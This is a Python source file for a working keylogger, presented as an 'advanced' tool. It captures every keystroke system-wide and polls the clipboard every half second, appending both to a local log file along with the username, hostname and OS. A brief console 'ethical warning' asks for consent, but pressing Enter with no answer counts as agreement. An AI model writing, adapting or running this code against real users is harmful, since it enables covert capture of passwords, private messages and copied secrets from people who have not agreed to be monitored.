from pynput.keyboard import Key, Listener
import logging
import os
import sys
import time
from datetime import datetime
import threading
import json
import platform
import getpass
from cryptography.fernet import Fernet
import pyperclip
from collections import deque


class AdvancedKeylogger:
    def __init__(self):
        # System Info Collection
        self.system_info = self.get_system_info()

        # Keep the log directory in the current directory.
        self.log_directory = os.path.join(os.getcwd(), "Keylogger_Logs")
        os.makedirs(self.log_directory, exist_ok=True)

        # Log file path
        self.log_file_path = os.path.join(self.log_directory, "keylog.txt")

        # Stop condition
        self.stop_password = "STOPLOG"  # Simple password
        self.password_buffer = ""
        self.should_stop = False

        # Clipboard monitoring
        self.last_clipboard_content = ""
        self.clipboard_check_interval = 2  # seconds
        self.last_clipboard_check = 0

        # Log system info
        self.log_system_info()

        # Start clipboard monitoring thread
        self.start_clipboard_monitor()

        print(f"Log file location: {self.log_file_path}")
        print(f"To close, type: {self.stop_password}")
        print("Logging started...\n")

    def get_system_info(self):
        """STEM Info Collection"""
        try:
            return {
                "os_name": platform.system(),
                "username": getpass.getuser(),
                "hostname": platform.node(),
                "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        except:
            return {"error": "System info unavailable"}

    def log_system_info(self):
        """Log system info"""
        with open(self.log_file_path, 'a', encoding='utf-8') as f:
            f.write("=" * 50 + "\n")
            f.write("KEYLOGGER STARTED\n")
            f.write("=" * 50 + "\n")
            f.write(f"System Information:\n")
            for key, value in self.system_info.items():
                f.write(f"{key}: {value}\n")
            f.write("=" * 50 + "\n\n")

    def start_clipboard_monitor(self):
        """Start clipboard monitoring thread"""

        def clipboard_monitor():
            while not self.should_stop:
                try:
                    current_time = time.time()
                    if current_time - self.last_clipboard_check >= self.clipboard_check_interval:
                        self.last_clipboard_check = current_time

                        # Try to get clipboard content
                        try:
                            clipboard_content = pyperclip.paste()
                        except:
                            clipboard_content = ""

                        # If there is new content and it is different from the previous one
                        if (clipboard_content and
                                clipboard_content != self.last_clipboard_content and
                                len(clipboard_content.strip()) > 0):
                            self.last_clipboard_content = clipboard_content

                            # Write clipboard contents to log file
                            with open(self.log_file_path, 'a', encoding='utf-8') as f:
                                f.write(f"\n[CLIPBOARD_COPY][{datetime.now().strftime('%H:%M:%S')}]\n")
                                f.write(f"{clipboard_content}\n")
                                f.write("[END_CLIPBOARD]\n")

                            print(f"\n[Clipboard captured: {clipboard_content[:50]}...]")

                except Exception as e:
                    # errors ignore Make sure the original program remains unaffected.
                    pass

                time.sleep(0.5)  # Check every half second

        # Start monitoring thread
        clipboard_thread = threading.Thread(target=clipboard_monitor, daemon=True)
        clipboard_thread.start()

    def format_key(self, key):
        """Format the key"""
        special_keys = {
            Key.space: ' ',
            Key.enter: '\n[ENTER]\n',
            Key.tab: '[TAB]',
            Key.backspace: '[BACKSPACE]',
            Key.delete: '[DELETE]',
            Key.esc: '[ESC]',
            Key.shift: '',
            Key.ctrl: '[CTRL]',
            Key.alt: '[ALT]',
        }

        if key in special_keys:
            return special_keys[key]

        try:
            return key.char
        except:
            return f'[{str(key)}]'

    def check_stop_condition(self, key):
        """Check stop condition """
        try:
            # What is being typed?
            if hasattr(key, 'char') and key.char:
                self.password_buffer += key.char
                # Check password
                if self.stop_password in self.password_buffer:
                    self.should_stop = True
                    return True
            elif key == Key.backspace:
                # Delete the last character from the password buffer when backspace is pressed
                self.password_buffer = self.password_buffer[:-1]

            # Trim the buffer if it is too large
            if len(self.password_buffer) > len(self.stop_password) * 2:
                self.password_buffer = self.password_buffer[-len(self.stop_password) * 2:]

        except Exception as e:
            print(f"Error in stop condition: {e}")

        return False

    def on_press(self, key):
        """Key press event """
        try:
            # Check stop condition
            if self.check_stop_condition(key):
                print(f"\nPassword detected! Closing keylogger...")
                return False

            # Log in
            formatted_key = self.format_key(key)

            with open(self.log_file_path, 'a', encoding='utf-8') as f:
                f.write(formatted_key)

            # Show progress in console
            if hasattr(key, 'char') and key.char:
                print(key.char, end='', flush=True)
            elif key == Key.space:
                print(' ', end='', flush=True)
            elif key == Key.enter:
                print('', flush=True)

        except Exception as e:
            print(f"Error: {e}")

        # Stop if stop flag is set
        if self.should_stop:
            return False

    def on_release(self, key):
        """Key release event """
        # You can close it by pressing ESC.
        if key == Key.esc:
            print("\nESC closed")
            return False

        # Stop if stop flag is set.
        if self.should_stop:
            return False

    def start(self):
        """Start keylogger"""
        try:
            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()

        except Exception as e:
            print(f"Error: {e}")
        finally:
            # Log the status at the end
            with open(self.log_file_path, 'a', encoding='utf-8') as f:
                f.write(f"\n\n{'=' * 50}\n")
                f.write(f"KEYLOGGER STOPPED\n")
                f.write(f"Stop Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'=' * 50}\n")

            print(f"\nKeylogger stopped. Log file: {self.log_file_path}")


# Ethical warning
def ethical_warning():
    print("⚠️ Moral warning:")
    print("=" * 50)
    print("1. Use only on your own device.")
    print("2.Do not use on other people's devices without permission.")
    print("3.Use for educational purposes only.")
    print("=" * 50)

    consent = input("Do you agree to use this tool ethically? (Yes/No): ")
    if consent.lower() not in ['Yes', 'yes', 'y', '']:
        print("The tool has been discontinued. Good decision!")
        sys.exit(0)


if __name__ == "__main__":
    ethical_warning()

    print("Starting keylogger...")
    print("Type to close: STOPLOG")
    print("or press ESC\n")

    keylogger = AdvancedKeylogger()
    keylogger.start()